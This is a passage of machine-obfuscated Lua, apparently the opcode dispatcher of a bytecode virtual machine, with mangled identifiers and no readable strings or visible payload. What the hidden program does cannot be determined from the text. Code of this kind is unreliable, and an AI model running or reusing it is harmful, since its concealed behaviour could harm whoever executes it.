];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2];snap_lIIlIIIllIIlIIIlI=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]];snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1]=snap_lIIlIIIllIIlIIIlI;snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIIlIIIllIIlIIIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1])snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))else snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];end;elseif snap_lIIlIIIllIIlIIIlI<=26 then if snap_lIIlIIIllIIlIIIlI<=21 then if snap_lIIlIIIllIIlIIIlI<=19 then if snap_lIIlIIIllIIlIIIlI==18 then snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];else snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];end;elseif snap_lIIlIIIllIIlIIIlI>20 then snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[3];else local snap_lIIlIIIllIIlIIIlI;local snap_IlIllIllIIlll,snap_lIlIlIIIIIlIIlIlllI;local snap_IIllIlIllIIlIlIIII;snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_IlIllIllIIlll,snap_lIlIlIIIIIlIIlIlllI=snap_IIIIlllIllllIIIIIlIll(snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3])))snap_IIIllIIIlllIIlIlll=snap_lIlIlIIIIIlIIlIlllI+snap_IIllIlIllIIlIlIIII-1 snap_lIIlIIIllIIlIIIlI=0;for snap_llIIlIlIlIllIlIl=snap_IIllIlIllIIlIlIIII,snap_IIIllIIIlllIIlIlll do snap_lIIlIIIllIIlIIIlI=snap_lIIlIIIllIIlIIIlI+1;snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl]=snap_IlIllIllIIlll[snap_lIIlIIIllIIlIIIlI];end;snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_IIIllIIIlllIIlIlll))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_IlIllIllIIlll,snap_lIlIlIIIIIlIIlIlllI=snap_IIIIlllIllllIIIIIlIll(snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3])))snap_IIIllIIIlllIIlIlll=snap_lIlIlIIIIIlIIlIlllI+snap_IIllIlIllIIlIlIIII-1 snap_lIIlIIIllIIlIIIlI=0;for snap_llIIlIlIlIllIlIl=snap_IIllIlIllIIlIlIIII,snap_IIIllIIIlllIIlIlll do 